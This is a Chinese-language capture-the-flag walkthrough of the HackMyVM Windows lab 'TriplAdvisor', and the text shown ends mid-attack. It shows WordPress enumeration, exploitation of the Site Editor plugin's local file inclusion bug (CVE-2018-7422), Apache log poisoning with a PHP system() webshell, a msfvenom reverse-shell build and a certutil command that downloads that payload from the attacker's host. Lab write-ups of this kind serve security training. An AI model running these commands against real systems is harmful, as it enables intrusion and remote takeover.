---
title: TriplAdvisor
author: hgbe02
date: 2025-06-04 17:40:38 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web,windows]  
permalink: "/Hackmyvm/TriplAdvisor.html"
---

# TriplAdvisor

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737262.png" alt="image-20250604114245534" style="zoom: 50%;" />

这里靶机是仅主机，根据自己的情况进行修改：

![image-20250604115340621](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737263.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737265.png" alt="image-20250604120117273" style="zoom: 50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ sudo rustscan -a $IP -- -sCV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
 
Open 192.168.10.102:445
Open 192.168.10.102:5985
Open 192.168.10.102:8080

PORT     STATE SERVICE       REASON          VERSION
445/tcp  open  microsoft-ds? syn-ack ttl 128
5985/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http          syn-ack ttl 128 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://tripladvisor:8080/wordpress/
|_http-server-header: Apache
|_http-favicon: Unknown favicon MD5: 3BD2EC61324AD4D27CB7B0F484CD4289
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 08:00:27:BC:3F:CE (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-04T04:07:56
|_  start_date: 2025-06-04T18:59:30
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59001/tcp): CLEAN (Timeout)
|   Check 2 (port 57067/tcp): CLEAN (Timeout)
|   Check 3 (port 10647/udp): CLEAN (Timeout)
|   Check 4 (port 41420/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 3s
```

### 目录扫描

发现存在一个域名解析以及跳转，看一下：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ sudo vim /etc/hosts             

┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ cat /etc/hosts | grep $IP                                                               
192.168.10.102  tripladvisor

┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ curl -I http://tripladvisor:8080/wordpress/                                    
HTTP/1.1 200 OK
Date: Wed, 04 Jun 2025 04:13:53 GMT
Server: Apache
Set-Cookie: PHPSESSID=npdfldo41ae5urlct2d4lb3114; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
X-Pingback: http://tripladvisor:8080/wordpress/xmlrpc.php
Link: <http://tripladvisor:8080/wordpress/wp-json/>; rel="https://api.w.org/"
Link: <http://tripladvisor:8080/wordpress/>; rel=shortlink
Content-Type: text/html; charset=UTF-8

┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ sudo dirsearch -u http://tripladvisor:8080/wordpress/ 2>/dev/null                                                                                     

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/temp/TriplAdvisor/reports/http_tripladvisor_8080/_wordpress__25-06-04_00-14-55.txt

Target: http://tripladvisor:8080/

[00:14:55] Starting: wordpress/
[00:15:18] 404 - 1016B  - /wordpress/%2e%2e//google.com
[00:15:18] 403 - 1004B  - /wordpress/%C0%AE%C0%AE%C0%AF
[00:15:18] 403 - 1018B  - /wordpress/%3f/
[00:15:33] 403 - 1004B  - /wordpress/%ff
CTRL+C detected: Pausing threads, please wait...
^C
Task Completed
```

没扫到啥暂时放弃，如果等下没线索再扫描。

### wpscan扫描

发现存在博客，进行扫描：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ wpscan --url http://tripladvisor:8080/wordpress/ --api-token XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://tripladvisor:8080/wordpress/ [192.168.10.102]
[+] Started: Wed Jun  4 00:18:14 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tripladvisor:8080/wordpress/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tripladvisor:8080/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://tripladvisor:8080/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tripladvisor:8080/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.19 identified (Outdated, released on 2024-06-24).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/, Match: '-release.min.js?ver=5.1.19'
 | Confirmed By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-includes/css/dist/block-library/style.min.css?ver=5.1.19
 |  - http://tripladvisor:8080/wordpress/wp-includes/js/wp-embed.min.js?ver=5.1.19

[+] WordPress theme in use: expert-adventure-guide
 | Location: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/
 | Last Updated: 2025-05-09T00:00:00.000Z
 | Readme: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19
 | Style Name: Expert Adventure Guide
 | Style URI: https://www.seothemesexpert.com/wordpress/free-adventure-wordpress-theme/
 | Description: Expert Adventure Guide is a specialized and user-friendly design crafted for professional adventure ...
 | Author: drakearthur
 | Author URI: https://www.seothemesexpert.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] editor
 | Location: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:02:52 <==============================================================================================================> (137 / 137) 100.00% Time: 00:02:52
[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Wed Jun  4 00:21:38 2025
[+] Requests Done: 186
[+] Cached Requests: 6
[+] Data Sent: 56.919 KB
[+] Data Received: 13.771 MB
[+] Memory used: 269.586 MB
[+] Elapsed time: 00:03:24
```

## 漏洞发现

### 组件漏洞利用

发现`wordpress`的一个组件，不知道是否存在漏洞，进行查询一下：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ searchsploit editor 1.1                                                                                        
----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Amaya 11.1 - W3C Editor/Browser 'defer' Remote Stack Overflow                                                                                              | windows/remote/8321.py
Amaya 11.1 - W3C Editor/Browser (defer) Stack Overflow (PoC)                                                                                               | windows/dos/8314.php
CMS from Scratch 1.1.3 - 'FCKeditor' Arbitrary File Upload                                                                                                 | php/webapps/5691.php
Django CMS 3.3.0 - Editor Snippet Persistent Cross-Site Scripting                                                                                          | python/webapps/40129.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                     | php/webapps/25493.txt
Maximus CMS 1.1.2 - 'FCKeditor' Arbitrary File Upload                                                                                                      | php/webapps/15960.txt
oXygen XML Editor 21.1.1 - XML External Entity Injection                                                                                                   | windows/local/47658.txt
pragmaMx 1.12.1 - '/includes/wysiwyg/spaw/editor/plugins/imgpopup/img_popup.php?img_url' Cross-Site Scripting                                              | php/webapps/37313.txt
Simple Machines Forum (SMF) 1.1.15 - 'fckeditor' Arbitrary File Upload                                                                                     | php/webapps/36410.txt
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                                                                                                  | php/webapps/44340.txt
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                                                                                            | php/webapps/44595.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results
```

看起来没啥头绪啊。。。换一个工具再扫一下，看看是不是漏了啥：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ cmseek -u http://tripladvisor:8080/wordpress/
___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  Deep Scan Results  [+] 

 ┏━Target: tripladvisor:8080
 ┃
 ┠── CMS: WordPress
 ┃    │
 ┃    ╰── URL: https://wordpress.org
 ┃
 ┠──[WordPress Deepscan]
 ┃    │
 ┃    ├── Readme file found: http://tripladvisor:8080/wordpress//readme.html
 ┃    ├── License file: http://tripladvisor:8080/wordpress//license.txt
 ┃    │
 ┃    ├── Plugins Enumerated: 1
 ┃    │    │
 ┃    │    ╰── Plugin: editor
 ┃    │        │
 ┃    │        ├── Version: 4.3
 ┃    │        ╰── URL: http://tripladvisor:8080/wordpress//wp-content/plugins/editor
 ┃    │
 ┃    │
 ┃    ├── Themes Enumerated: 1
 ┃    │    │
 ┃    │    ╰── Theme: expert-adventure-guide
 ┃    │        │
 ┃    │        ├── Version: 5.1.19
 ┃    │        ╰── URL: http://tripladvisor:8080/wordpress//wp-content/themes/expert-adventure-guide
 ┃    │
 ┃    │
 ┃    ├── Usernames harvested: 1
 ┃    │    ╰── admin
 ┃    │
 ┃
 ┠── Result: /home/kali/temp/TriplAdvisor/Result/tripladvisor_8080_wordpress/cms.json
 ┃
 ┗━Scan Completed in 19.36 Seconds, using 44 Requests



 CMSeeK says ~ addio
```

然后往回找找，发现：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ curl http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
=== Site Editor - WordPress Site Builder - Theme Builder and Page Builder ===
Contributors: wpsiteeditor
Tags: site editor, site builder, page builder, theme builder, theme framework, design, inline editor, inline text editor, layout builder,live options, live, customizer, theme customizer, header builder, footer builder, fully customizable, design options,design editor, options framework, front end, page builder plugin, builder, responsive, front end editor, landing page, editor, drag-and-drop, shortcode, wordpress, ultra flexible, unlimited tools, elements, modules, support, seo, animation, absolute flexibility, live theme options, video backgrounds, font awesome, Optimized, fast, quick, ux, ui
Requires at least: 4.7
Tested up to: 4.7.4
Stable tag: 1.1
License: GPLv3
License URI: https://www.gnu.org/licenses/gpl-3.0.html

SiteEditor is The best solution for build your Wordpress site with The best drag and drop WordPress Site, theme and Page Builder.Any theme, any page, any design.

== Description ==

**What is the Site Editor?**

Site Editor is the most powerful Site Builder which is designed for WordPress. It's a powerful, advanced, user-friendly front end editor and you can build your website via drag and drop and full live options. Site Editor is also a powerful front-end platform for the developer.

**OUR OFFICIAL WEBSITE & GITHUB**

[SiteEditor.ORG](https://www.siteeditor.org)

[SiteEditor GitHub Repository](https://github.com/SiteEditor/editor)

-----------
```

然后发现了全称为`Site Editor`，前面筛选到了这个洞，尝试进行利用：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ searchsploit Site Editor 1.1
----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Django CMS 3.3.0 - Editor Snippet Persistent Cross-Site Scripting                                                                                          | python/webapps/40129.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                     | php/webapps/25493.txt
pragmaMx 1.12.1 - '/includes/wysiwyg/spaw/editor/plugins/imgpopup/img_popup.php?img_url' Cross-Site Scripting                                              | php/webapps/37313.txt
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                                                                                                  | php/webapps/44340.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results

┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ searchsploit -m php/webapps/44340.txt
  Exploit: WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/44340
     Path: /usr/share/exploitdb/exploits/php/webapps/44340.txt
    Codes: CVE-2018-7422
 Verified: True
File Type: Unicode text, UTF-8 text
Copied to: /home/kali/temp/TriplAdvisor/44340.txt

┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ cat 44340.txt            
Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-editor/
Vendor: Site Editor
Tested version: 1.1.1
CVE ID: CVE-2018-7422

** CVE description **
A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.

** Technical details **
In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php:5, the value of the ajax_path parameter is used for including a file with PHP’s require_once(). This parameter can be controlled by an attacker and is not properly sanitized.

Vulnerable code:
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
    require_once $_REQUEST['ajax_path'];
}

https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5

By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

** Solution **
No fix available yet.

** Timeline **
03/01/2018: author contacted through siteeditor.org's contact form; no reply
16/01/2018: issue report filled on the public GitHub page with no technical details
18/01/2018: author replies and said he replied to our e-mail 8 days ago (could not find the aforementioned e-mail at all); author sends us "another" e-mail
19/01/2018: report sent; author says he will fix this issue "very soon"
31/01/2018: vendor contacted to ask about an approximate release date and if he needs us to postpone the disclosure; no reply
14/02/2018: WP Plugins team contacted; no reply
06/03/2018: vendor contacted; no reply
07/03/2018: vendor contacted; no reply
15/03/2018: public disclosure

** Credits **
Vulnerability discovered by Nicolas Buzy-Debat working at Orange Cyberdefense Singapore (CERT-LEXSI).

--
Best Regards,

Nicolas Buzy-Debat
Orange Cyberdefense Singapore (CERT-LEXSI) 
```

进行确认一下，因为知道这个是 windows 机子，所以可以尝试一下相关目录，比如：

```bash
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
/windows/system32/license.rtf
/windows/system32/eula.txt
```

以及这里的路径也要改一下：

```bash
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
http://tripladvisor:8080/wordpress//wp-content/plugins/editor
```

改一下发现有了：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ curl -s 'http://tripladvisor:8080/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/windows/system32/drivers/etc/hosts' | html2text






















Skip_to_content
The best travel online guide!


    * Home

 Search for: [Unknown INPUT type]
CLOSE
 [TriplAdvisor]
   1. Home  / 
   2. Error 404
****** Error 404 ******
Copyright © 2023, Adventure_Guide  |  WordPress_Theme
TOP
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ curl -s 'http://tripladvisor:8080/wordpress//wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/windows/system32/drivers/etc/hosts' | html2text
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used
by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP
addresses to host names. Each # entry should be kept on an individual line. The
IP address should # be placed in the first column followed by the corresponding
host name. # The IP address and the host name should be separated by at least
one # space. # # Additionally, comments (such as these) may be inserted on
individual # lines or following the machine name denoted by a '#' symbol. # #
For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10
x.acme.com # x client host # localhost name resolution is handled within DNS
itself. # 127.0.0.1 localhost # ::1 localhost {"success":true,"data":{"output":
[]}}
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ curl -s 'http://tripladvisor:8080/wordpress//wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/windows/system32/drivers/etc/hosts'
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
{"success":true,"data":{"output":[]}}
```

尝试爆破一下常见目录吧：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ ll /usr/share/seclists/Fuzzing/LFI
total 872
-rw-r--r-- 1 root root 254354 Feb 16  2024 LFI-etc-files-of-all-linux-packages.txt
-rw-r--r-- 1 root root  22883 Feb 16  2024 LFI-gracefulsecurity-linux.txt
-rw-r--r-- 1 root root   9416 Feb 16  2024 LFI-gracefulsecurity-windows.txt
-rw-r--r-- 1 root root  32507 Feb 16  2024 LFI-Jhaddix.txt
-rw-r--r-- 1 root root 501947 Feb 16  2024 LFI-LFISuite-pathtotest-huge.txt
-rw-r--r-- 1 root root  22215 Feb 16  2024 LFI-LFISuite-pathtotest.txt
-rw-r--r-- 1 root root  31898 Feb 16  2024 LFI-linux-and-windows_by-1N3@CrowdShield.txt
-rw-r--r-- 1 root root   2165 Feb 16  2024 OMI-Agent-Linux.txt

┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ wfuzz -c -w //usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u "http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ" --hh 72 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ
Total requests: 235

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000044:   200        7 L      13 W       129 Ch      "C:/Windows/win.ini"                                                                                                        
000000043:   200        21 L     135 W      861 Ch      "C:/WINDOWS/System32/drivers/etc/hosts"                                                                                     
000000048:   200        939 L    15552 W    206724 Ch   "C:/xampp/apache/logs/access.log"                                                                                           
000000049:   200        33746    712193 W   5744606 C   "C:/xampp/apache/logs/error.log"                                                                                            
                        L                   h                                                                                                                                       
000000164:   200        0 L      1 W        37 Ch       "c:/xampp/phpMyAdmin/config.inc.php"                                                                                        
000000163:   500        0 L      0 W        0 Ch        "c:/xampp/php/php.ini"                                                                                                      
000000165:   200        72 L     319 W      2133 Ch     "c:/xampp/sendmail/sendmail.ini"                                                                                            
000000160:   200        564 L    2563 W     21507 Ch    "c:/xampp/apache/conf/httpd.conf"                                                                                           
000000154:   200        1092 L   17388 W    243793 Ch   "c:/xampp/apache/logs/access.log"                                                                                           
000000155:   200        33746    712193 W   5744606 C   "c:/xampp/apache/logs/error.log"                                                                                            
                        L                   h                                                                                                                                       
000000229:   200        0 L      1 W        37 Ch       "c:/WINDOWS/setuperr.log"                                                                                                   
000000227:   200        176 L    1036 W     14543 Ch    "c:/WINDOWS/setupact.log"                                                                                                   
000000219:   200        79 L     585 W      3720 Ch     "c:/WINDOWS/system32/drivers/etc/lmhosts.sam"                                                                               
000000220:   200        16 L     55 W       444 Ch      "c:/WINDOWS/system32/drivers/etc/networks"                                                                                  
000000218:   200        21 L     135 W      861 Ch      "c:/WINDOWS/system32/drivers/etc/hosts"                                                                                     
000000221:   200        27 L     171 W      1395 Ch     "c:/WINDOWS/system32/drivers/etc/protocol"                                                                                  
000000222:   200        285 L    1238 W     17500 Ch    "c:/WINDOWS/system32/drivers/etc/services"                                                                                  
000000232:   200        2806 L   28871 W    227306 Ch   "c:/WINDOWS/WindowsUpdate.log"                                                                                              

Total time: 0
Processed Requests: 235
Filtered Requests: 217
Requests/sec.: 0
```

发现存在日志包含漏洞，可以尝试进行利用：

```bash
curl -A "<?php system(\$_GET['cmd']);?>"  http://tripladvisor:8080/wordpress/ 
```

但是我似乎把日志玩坏了，尝试重新导入镜像。。。。然后再试一次：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ curl "http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=dir"
192.168.56.1 - - [14/Aug/2024:10:42:52 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/error.log HTTP/1.1" 200 5728866 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:43:07 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 272 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:44:38 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 504 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:52:26 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 736 "-" "curl/8.8.0"
192.168.56.1 - - [15/Aug/2024:21:00:56 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 968 "-" "curl/8.8.0"
192.168.56.1 - - [25/Nov/2024:22:26:47 -0800] "GET / HTTP/1.1" 302 - "-" "curl/8.10.1"
192.168.10.101 - - [04/Jun/2025:15:07:45 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log HTTP/1.1" 200 1288 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
192.168.10.101 - - [04/Jun/2025:15:08:02 -0700] "GET /wordpress/ HTTP/1.1" 200 22542 "-" " Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of C:\xampp\htdocs\wordpress\wp-content\plugins\editor\editor\extensions\pagebuilder\includes

06/30/2024  10:00 AM    <DIR>          .
06/30/2024  10:00 AM    <DIR>          ..
06/30/2024  10:00 AM             9,400 ajax_shortcode_pattern.php
06/30/2024  10:00 AM            26,382 pagebuilder-options-manager.class.php
06/30/2024  10:00 AM            68,418 pagebuilder.class.php
06/30/2024  10:00 AM             5,561 pagebuildermodules.class.php
06/30/2024  10:00 AM            34,306 pb-shortcodes.class.php
06/30/2024  10:00 AM            16,293 pb-skin-loader.class.php
               6 File(s)        160,360 bytes
               2 Dir(s)  23,849,553,920 bytes free
"
fe80::5479:dd94:1d27:478c - - [04/Jun/2025:15:08:07 -0700] "POST /wordpress/wp-cron.php?doing_wp_cron=1749074886.8125000000000000000000 HTTP/1.1" 200 - "http://tripladvisor:8080/wordpress/wp-cron.php?doing_wp_cron=1749074886.8125000000000000000000" "WordPress/5.1.19; http://tripladvisor:8080/wordpress"
{"success":true,"data":{"output":[]}}
```

成功rce！

### RCE获取shell

先生成一个反弹shell脚本：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ msfvenom --payload windows/x64/shell_reverse_tcp LHOST=192.168.10.101 LPORT=1234 -f exe -o revshell.exe                                                                                
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```

然后：

```bash
# 也可以使用 python3 -m http.server 8888，但是差生文具多。。。。
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ updog -p 8888
[+] Serving /home/kali/temp/TriplAdvisor...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8888
 * Running on http://10.0.2.4:8888
Press CTRL+C to quit
```

上传本地的脚本，监听然后激活即可：

```bash
# 设置监听
┌──(kali💀kali)-[~]
└─$ sudo pwncat-cs -lp 1234 -m windows 2>/dev/null     
[02:34:30] Welcome to pwncat 🐈!
```

尝试下载：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ curl "http://tripladvisor:8080/wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=certutil+-urlcache+-split+-f+http://192.168.10.101:8888/revshell.exe+C:\Windows\Temp\revshell.exe"
192.168.56.1 - - [14/Aug/2024:10:42:52 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/error.log HTTP/1.1" 200 5728866 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:43:07 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 272 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:44:38 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 504 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:52:26 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 736 "-" "curl/8.8.0"
